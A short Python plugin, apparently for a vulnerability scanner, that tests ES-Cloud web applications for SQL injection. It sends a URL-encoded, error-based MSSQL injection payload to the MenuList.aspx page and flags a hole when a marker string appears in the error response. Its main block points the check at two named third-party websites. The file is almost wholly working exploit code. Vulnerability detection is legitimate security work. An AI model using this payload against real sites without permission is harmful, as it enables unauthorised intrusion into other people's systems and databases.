#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-099537
#__Author__ = 上善若水
#_PlugName_ = ES-Cloud_sql Plugin
#_FileName_ = ES-Cloud_sql.py



def assign(service, arg):
    if service == "es-cloud":
        return True, arg 	

def audit(arg):
    url = arg + 'Easy/AppNew/MenuList.aspx?AppId=11'
    payload = '%20AND%202391%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%2899999-33333%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C100%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29'
    code, head, body, errcode, _url = curl.curl(url+payload)
    if code == 500 and 'qpbqq66666qzpxq' in body:
        security_hole(url)
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('es-cloud', 'http://wr-sz.cn/')[1])
    audit(assign('es-cloud', 'http://gxbdsp.com/')[1])
